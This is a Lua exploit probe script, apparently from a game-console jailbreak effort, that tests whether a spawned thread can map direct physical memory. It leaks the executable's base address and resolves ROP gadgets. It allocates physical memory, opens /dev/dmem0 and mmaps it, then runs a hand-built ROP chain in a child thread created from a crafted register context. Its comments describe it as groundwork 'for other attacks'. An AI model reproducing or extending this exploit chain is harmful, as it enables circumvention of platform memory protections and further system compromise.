-- CRASH_CLASS: MODERATE
-- PROBE 532c: Alternative to MapDirectMemory — open dmem0 + mmap from child
--
-- If MapDirectMemory library function crashes (TLS, internal state),
-- try the raw approach: open("/dev/dmem0") + mmap(fd, phys_offset).
-- This uses only syscalls, no library functions (except sysarch for TLS).
--
-- BUT: we know mmap(477) on dmem0 only maps within the pool
-- (0x100000000-0x150000000). So this gives us the same as dmem0 mmap
-- from main thread. The value of MapDirectMemory is it MIGHT map
-- outside the pool.
--
-- Still, this probe tests the child thread's ability to open files
-- and mmap, which is useful for other attacks.
--
-- AllocateDirectMemory gives us a phys addr (e.g. 0x110010000).
-- That's inside the pool (0x100000000 base, 0x50000000 size = 0x150000000).
-- Pool-relative offset = phys - 0x100000000 = 0x10010000.
-- mmap(0, 0x4000, PROT_RW, MAP_SHARED, dmem0_fd, pool_offset)
--
-- Chain: sysarch → open("/dev/dmem0") → mmap(fd) → store VA → done

print("=== PROBE 532c: CHILD DMEM MMAP ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end

local sc_mmap = make_syscall(477)
local sc_430 = make_syscall(430)
local sc_nanosleep = make_syscall(240)
local sc_thr_kill = make_syscall(433)
local syscall_ret = syscall.pipe.fn_addr

local ok_p, pid_v = pcall(function() return make_syscall(20)() end)
print("pid=" .. q(pid_v))

local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eb_lo = rd(info + 0x108) or 0
local eb_hi = rd(info + 0x10C) or 0
local eboot = uint64(string.format("0x%X%08X", eb_hi or 0, eb_lo or 0))
print("eb=" .. q(eboot))

local pop_rax_ret = eboot + uint64(0x992)
local pop_rdi_ret = eboot + uint64(0xC9DFE)
local pop_rsi_ret = eboot + uint64(0xD77D)
local pop_rdx_ret = eboot + uint64(0x3B02D7)
local pop_rcx_ret = eboot + uint64(0xE64)
local mov_rdi_rax_ret = eboot + uint64(0x92C67)
local jmp_self = eboot + uint64(0x15481)
local bare_ret = eboot + uint64(0x42)

-- [A] Alloc phys from main thread
print("[A] Alloc phys")
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0x2001), info) end)
local lk_lo = rd(info + 0x108) or 0
local lk_hi = rd(info + 0x10C) or 0
local lk = uint64(string.format("0x%X%08X", lk_hi or 0, lk_lo or 0))
local alloc_fn = lk + uint64(0x17EF0)

local phys_out = memory.alloc(8)
wq(phys_out, uint64(0))
pcall(function()
    native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(phys_out))
end)
local phys = rq(phys_out)
print("  phys=" .. q(phys))
if not phys or to_num(phys) == 0 then print("FAIL") return end

-- Pool offset: phys - 0x100000000
local pool_offset = phys - uint64("0x100000000")
print("  pool_offset=" .. q(pool_offset))

-- [B] Also open dmem0 from main thread to get fd
print("[B] Open /dev/dmem0")
local devpath = memory.alloc(32)
-- "/dev/dmem0" bytes: 2F 64 65 76 2F 64 6D 65 6D 30 00
-- Little-endian dwords:
--   [0]: 76 65 64 2F → 0x7665642F
--   [4]: 65 6D 64 2F → 0x656D642F
--   [8]: 00 00 30 6D → 0x0000306D
zero(devpath, 32)
wd(devpath + 0, 0x7665642F)  -- "/dev" (LE: 2F 64 65 76)
wd(devpath + 4, 0x656D642F)  -- "/dme" (LE: 2F 64 6D 65)
wd(devpath + 8, 0x0000306D)  -- "m0\0" (LE: 6D 30 00 00)

local sc_open = make_syscall(5)
local ok_o, dmem_fd = pcall(function()
    return sc_open(uint64(devpath), uint64(0x10002), uint64(0))
end)
print("  dmem_fd=" .. q(dmem_fd))

-- Test: mmap dmem0 from main thread
local ok_mt, mmap_va = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x0001), dmem_fd, pool_offset)
end)
print("  main_mmap=" .. q(mmap_va))

-- Verify main thread mmap
if mmap_va then
    local test_v = rd(to_num(mmap_va))
    print("  main_read=" .. (test_v and string.format("0x%X", test_v) or "FAULT"))
end

-- [C] Setup child thread
print("[C] Setup")
local ok_s, shared = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
zero(shared, 0x4000)
wq(shared + 0x00, uint64(0xAAAA))   -- open rv (fd)
wq(shared + 0x08, uint64(0xBBBB))   -- mmap rv (VA)
wq(shared + 0x10, uint64(0xCCCC))   -- done

local ok_st, stack_base = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)

local ok_t, tcb_page = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
for off = 0, 0x100, 8 do wq(tcb_page + off, tcb_page) end
local tcb_ptr = memory.alloc(8)
wq(tcb_ptr, tcb_page)

-- [D] Build chain: sysarch → open → mmap → store → park
-- All syscalls, no library functions!
print("[D] Chain")
local chain = stack_base + 0x200000 - 0x800
local i = 0
local function emit(v) wq(chain + i, v); i = i + 8 end

-- sysarch(165, 129, &tcb)
emit(uint64(165))
emit(pop_rdi_ret); emit(uint64(129))
emit(pop_rsi_ret); emit(tcb_ptr)
emit(syscall_ret)

-- open("/dev/dmem0", O_RDWR|O_NONBLOCK=0x10002, 0)
-- rax=5, rdi=path, rsi=flags, rdx=mode
emit(pop_rax_ret); emit(uint64(5))
emit(pop_rdi_ret); emit(devpath)
emit(pop_rsi_ret); emit(uint64(0x10002))
emit(pop_rdx_ret); emit(uint64(0))
emit(syscall_ret)

-- store open rv (fd) → shared[0]
emit(pop_rdi_ret); emit(shared)
emit(mov_rdi_rax_ret)

-- Now rax = fd. We need it for mmap.
-- mmap(477): rdi=addr, rsi=len, rdx=prot, r10=flags, r8=fd, r9=offset
-- Problem: we need fd in r8, but we can't set r8 from ROP chain!
-- We set r8 from the initial context... but we don't know fd yet.
--
-- ALTERNATIVE: Use the MAIN THREAD's fd. We already have dmem_fd.
-- Set r8 = dmem_fd in context. r9 = pool_offset in context.
-- Then in the chain, just set rdi/rsi/rdx/r10 and call mmap.
--
-- But wait — mmap is syscall 477, and it uses r10 for flags, not rcx.
-- FreeBSD syscall convention: rdi, rsi, rdx, r10, r8, r9
-- We don't have pop_r10. In context, +0x060 = R10.
-- Can we leave r10 from context? But sysarch syscall clobbers r10?
-- Actually syscall clobbers rcx and r11. NOT r10.
-- r10 from context should survive if we don't modify it.
--
-- BUT sysarch has arg4 in r10 position... no wait, sysarch only has
-- 2 args: rdi=op, rsi=parms. r10 is not an arg.
-- After sysarch syscall: r10 should still have its context value.
--
-- Plan: set r10=MAP_SHARED(1) in context (+0x060),
--       r8=dmem_fd in context (+0x068),
--       r9=pool_offset in context (+0x070)
-- Chain: after sysarch and store, set rdi=0, rsi=0x4000, rdx=3,
--       rax=477, syscall.
-- r10/r8/r9 come from context and survive sysarch.

-- Rewrite: restart chain with this plan
-- Reset
i = 0

-- sysarch(165, 129, &tcb)
emit(uint64(165))
emit(pop_rdi_ret); emit(uint64(129))
emit(pop_rsi_ret); emit(tcb_ptr)
emit(syscall_ret)

-- mmap(477): rdi=0, rsi=0x4000, rdx=3
-- r10=MAP_SHARED(1) from context, r8=fd from context, r9=pool_offset from context
emit(pop_rax_ret); emit(uint64(477))
emit(pop_rdi_ret); emit(uint64(0))
emit(pop_rsi_ret); emit(uint64(0x4000))
emit(pop_rdx_ret); emit(uint64(3))
emit(syscall_ret)

-- store mmap rv → shared[0x08]
emit(pop_rdi_ret); emit(shared + 0x08)
emit(mov_rdi_rax_ret)

-- done marker
emit(pop_rdi_ret); emit(shared + 0x10)
emit(pop_rax_ret); emit(uint64(0x444F4E45))
emit(mov_rdi_rax_ret)

-- jmp_self to park
emit(jmp_self)

print(string.format("  chain=%d bytes (%d entries)", i, i/8))

-- [E] Context: r10=MAP_SHARED, r8=dmem_fd, r9=pool_offset
print("[E] Context")
local ctx = memory.alloc(0x500)
zero(ctx, 0x500)
wq(ctx + 0x108, uint64(0x480))
wd(ctx + 0x0D0, 0)
wq(ctx + 0x110, uint64(0x10000))
wq(ctx + 0x0C0, uint64(0x43))
wq(ctx + 0x100, uint64(0x3B))
wq(ctx + 0x0F0, uint64(0x202))
wq(ctx + 0x0E0, pop_rax_ret)     -- RIP
wq(ctx + 0x0F8, chain)            -- RSP
-- Key: r10=flags, r8=fd, r9=offset
wq(ctx + 0x060, uint64(1))        -- r10 = MAP_SHARED
wq(ctx + 0x068, dmem_fd)          -- r8 = dmem0 fd
wq(ctx + 0x070, pool_offset)      -- r9 = pool offset

print("  r10(flags)=1")
print("  r8(fd)=" .. q(dmem_fd))
print("  r9(off)=" .. q(pool_offset))

-- [F] Spawn
print("[F] thr_create")
local tid_buf = memory.alloc(8); wq(tid_buf, uint64(0))
local ok_tc, rv_tc = pcall(function()
    return sc_430(uint64(ctx), uint64(tid_buf), uint64(0))
end)
print("  rv=" .. tostring(to_num(rv_tc)) .. " tid=" .. q(rq(tid_buf)))

if to_num(rv_tc) ~= 0 then
    print("  CONTEXT REJECTED")
    print("=== 532c DONE ===")
    return
end

-- [G] Wait
print("[G] Wait")
local ts = memory.alloc(16); wq(ts, 0); wq(ts + 8, 100000000)
local done = false
for attempt = 1, 30 do
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
    local m = rq(shared + 0x10)
    if m then
        local mn = to_num(m); if mn < 0 then mn = mn + 0x100000000 end
        if mn ~= 0 and mn ~= 0xCCCC then done = true; break end
    end
end

-- [H] Results
print("[H] Results")
local mmap_va_child = rq(shared + 0x08)
print("  mmap_rv=" .. q(mmap_va_child))
print("  done=" .. q(rq(shared + 0x10)) .. " (" .. tostring(done) .. ")")

if done then
    local mn = to_num(mmap_va_child); if mn < 0 then mn = mn + 0x100000000 end
    if mn > 0 and mn ~= 0xBBBB then
        print("  *** CHILD MMAP SUCCEEDED ***")
        -- Verify R/W from main thread
        local ok_w = pcall(function() memory.write_dword(mmap_va_child, 0xDEADBEEF) end)
        local rb = rd(mn)
        if rb then
            if rb < 0 then rb = rb + 0x100000000 end
            print(string.format("  write 0xDEADBEEF -> read 0x%08X", rb))
        else
            print("  read fault at child mmap VA")
        end
    else
        print("  mmap returned error or sentinel")
    end
else
    print("  Child did not complete — crashed during chain")
    local ok_k, rv_k = pcall(function() return sc_thr_kill(rq(tid_buf), uint64(0)) end)
    print("  thr_kill=" .. tostring(to_num(rv_k)))
end

print("=== 532c DONE ===")
